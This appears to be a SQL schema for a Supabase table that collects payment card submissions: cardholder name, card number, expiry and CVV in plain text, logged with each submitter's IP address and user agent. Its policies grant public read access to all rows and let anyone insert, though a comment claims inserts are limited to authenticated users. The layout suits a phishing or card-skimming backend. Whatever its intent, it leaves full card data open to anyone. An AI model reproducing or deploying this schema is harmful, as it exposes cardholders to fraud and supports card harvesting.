-- Create submissions table in Supabase
CREATE TABLE IF NOT EXISTS submissions (
  id BIGSERIAL PRIMARY KEY,
  timestamp TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
  nameOnCard TEXT NOT NULL,
  cardNumber TEXT NOT NULL,
  expiry TEXT NOT NULL,
  cvv TEXT NOT NULL,
  ip TEXT,
  userAgent TEXT,
  createdAt TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
);

-- Create an index on timestamp for faster queries
CREATE INDEX IF NOT EXISTS idx_submissions_timestamp ON submissions(timestamp DESC);

-- Enable Row Level Security (optional but recommended)
ALTER TABLE submissions ENABLE ROW LEVEL SECURITY;

-- Allow public read access (optional - remove if you want to restrict access)
CREATE POLICY "Allow public read access" ON submissions
  FOR SELECT USING (true);

-- Allow insert access from service role or authenticated users
CREATE POLICY "Allow insert from authenticated" ON submissions
  FOR INSERT WITH CHECK (true);
